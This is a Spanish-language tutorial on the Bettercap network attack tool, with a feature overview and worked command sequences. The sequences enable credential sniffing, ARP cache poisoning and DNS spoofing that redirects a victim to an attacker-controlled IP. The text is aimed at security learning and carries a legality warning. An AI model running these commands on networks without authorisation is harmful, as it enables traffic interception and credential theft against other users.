# Bettercap

## ¿Qué es Bettercap?

Bettercap es una herramienta de línea de comandos, potente y modular, a menudo descrita como la "navaja suiza" para los ataques de red y las pruebas de penetración. Es el sucesor espiritual de herramientas clásicas como `Ettercap` y `dsniff`, pero rediseñada para ser más potente, estable y fácil de usar en los entornos de red modernos.

Su objetivo principal es permitir a los profesionales de la seguridad y a los investigadores realizar ataques de **Man-in-the-Middle (MITM)**, esnifar (sniffing) el tráfico de la red, y realizar una variedad de auditorías de seguridad en redes cableadas y Wi-Fi.

## ¿Para qué es útil la herramienta?

Bettercap es una herramienta todo-en-uno para el análisis y ataque de redes. Sus capacidades la hacen indispensable para:

*   **Ataques Man-in-the-Middle (MITM):** Es su función más conocida. Permite interceptar el tráfico entre dos dispositivos en una red (por ejemplo, entre un usuario y el router).
*   **Sniffing de Credenciales:** Una vez que el tráfico está siendo interceptado, Bettercap puede analizarlo en tiempo real para capturar credenciales de protocolos no cifrados como HTTP, FTP, Telnet, etc.
*   **Auditoría de Redes Wi-Fi:**
    *   Descubrimiento de redes y clientes (simiar a `airodump-ng`).
    *   Realización de ataques de desautenticación para desconectar clientes.
    *   Captura de handshakes WPA/WPA2 para su posterior análisis.
    *   Creación de Puntos de Acceso (AP) falsos.
*   **Suplantación de DNS (DNS Spoofing):** Permite responder a las solicitudes de DNS de una víctima con una dirección IP falsa, redirigiendo así a un usuario de `google.com` a un sitio malicioso controlado por el atacante.
*   **Proxy HTTP/HTTPS:** Puede actuar como un proxy transparente para manipular el tráfico web sobre la marcha, inyectar código JavaScript, reemplazar imágenes, etc.
*   **Descubrimiento de Red:** Realiza un sondeo activo de la red para encontrar nuevos hosts tan pronto como se conectan.

## ¿Cómo se usa? (Ejemplo básico)

Bettercap funciona como un shell interactivo con diferentes módulos que se pueden activar y desactivar.

**Sintaxis de inicio:**
```bash
sudo bettercap -iface [interfaz_de_red]
```
* `-iface` especifica la interfaz de red a utilizar (por ejemplo, `eth0` para cable, `wlan0` para inalámbrica).

Una vez dentro del shell interactivo de Bettercap, puedes usar el comando `help` para ver una lista de los módulos y comandos disponibles.

**Ejemplo 1: Sniffing de red básico**

Este ejemplo mostrará el tráfico de la red y buscará credenciales.

1.  **Iniciar Bettercap:**
    ```bash
    sudo bettercap -iface eth0
    ```

2.  **Activar el descubrimiento de hosts y el sniffer:**
    ```
    net.probe on
    net.sniff on
    ```

    Bettercap comenzará a descubrir hosts en la red (`net.probe`) y a analizar el tráfico en busca de información interesante (`net.sniff`). Si un usuario en la red inicia sesión en un sitio web por HTTP, sus credenciales podrían aparecer en tu pantalla.

**Ejemplo 2: Ataque MITM con ARP Spoofing y DNS Spoofing**

Este ejemplo redirigirá todo el tráfico de la red a través de tu máquina.

1.  **Iniciar Bettercap:**
    ```bash
    sudo bettercap -iface eth0
    ```

2.  **Activar el ARP spoofer:**
    Esto envenenará la caché ARP de todos los dispositivos en la red para que piensen que tu máquina es el router.
    ```
    set arp.spoof.fullduplex true
    set arp.spoof.targets [IP_de_la_victima]  // Opcional, para atacar a un solo objetivo
    arp.spoof on
    ```

3.  **Activar el DNS spoofer:**
    Esto te permitirá interceptar las peticiones DNS.
    ```
    set dns.spoof.all true
    set dns.spoof.domains example.com
    set dns.spoof.address 1.2.3.4 // IP del servidor malicioso
    dns.spoof on
    ```
    Ahora, cuando la víctima intente ir a `example.com`, será redirigida a la IP `1.2.3.4`.

## Caplets

Bettercap también utiliza **caplets** (`.cap`), que son archivos de script para automatizar secuencias de comandos. Esto es extremadamente útil para lanzar ataques complejos con un solo comando.

## Consideraciones Adicionales

*   **Escrito en Go:** Bettercap es un binario compilado escrito en Go, lo que lo hace muy rápido, eficiente y portátil, sin dependencias externas complicadas.
*   **Legalidad:** Realizar ataques MITM en una red sin autorización explícita es ilegal y puede causar interrupciones graves en el servicio. Utiliza Bettercap de forma responsable y solo en redes de tu propiedad o con permiso.
*   **HTTPS y HSTS:** Los ataques MITM contra el tráfico web son menos efectivos en la actualidad debido a la adopción masiva de HTTPS y mecanismos de seguridad como HSTS (HTTP Strict Transport Security). Bettercap tiene un módulo (`https.strip`) que intenta degradar las conexiones a HTTP, pero su éxito es limitado en sitios bien configurados.

---
*Nota: La información proporcionada aquí es para fines educativos y de seguridad ética. No uses esta herramienta para actividades maliciosas.*
